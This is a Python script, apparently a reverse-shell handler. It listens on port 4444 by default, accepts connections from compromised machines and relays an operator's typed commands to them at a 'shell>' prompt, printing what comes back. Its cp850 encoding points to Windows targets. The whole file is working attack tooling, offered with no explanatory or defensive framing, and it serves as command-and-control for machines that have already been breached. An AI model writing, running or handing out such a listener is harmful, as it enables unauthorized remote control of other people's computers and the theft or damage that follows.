import socket
import sys
import threading

def handle_client(conn, addr):
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    try:
        while True:
            cmd = input("shell> ")
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit"):
                conn.send(b"exit\n")
                break
            conn.send(cmd.encode('cp850') + b"\n")
            response = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                response += chunk
                if response.endswith(b"\r\n") or response.endswith(b"\n"):
                    break
            if response:
                print(response.decode('cp850', errors='ignore'), end='')
    except Exception as e:
        print(f"[-] Error: {e}")
    conn.close()
    print(f"[-] Connection closed: {addr[0]}:{addr[1]}")

def start_listener(host="0.0.0.0", port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.daemon = True
        thread.start()

if __name__ == "__main__":
    if len(sys.argv) > 2:
        start_listener(sys.argv[1], int(sys.argv[2]))
    else:
        start_listener()